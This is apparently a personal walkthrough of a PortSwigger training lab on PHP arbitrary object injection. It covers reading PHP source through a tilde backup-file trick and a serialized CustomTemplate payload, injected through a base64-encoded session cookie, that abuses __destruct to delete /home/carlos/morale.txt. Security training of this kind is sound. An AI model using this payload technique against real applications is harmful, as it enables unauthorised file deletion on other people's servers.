# URL
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php
# Objective
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials:`wiener:peter` 
# Method of Solve
1) Look at the HTTP source for the landing page of the web app. It references an endpoint `/libs/CustomTemplate.php`
2) When we navigate to this endpoint, we don't see anything, but some apps allow us to use a tilde at the end of the file name to see the PHP file contents
3) According to the code, the app deletes any file defined in the $lock_file_path variable:
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
So we can define the file we're supposed to delete as the $lock_file_path like this:
```
O:14:"CustomTemplate":2:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
So we'll add this to our current Cookie contents and Base64 encode it with the following:
```
echo -n 'a:2:{i:0;O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"g9r8kznko8p7yroc97n5n4omqblbplxc";}i:1;O:14:"CustomTemplate":2:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}}' | base64 -w 0
```
4) Take the output of the previous command and replace the current cookie
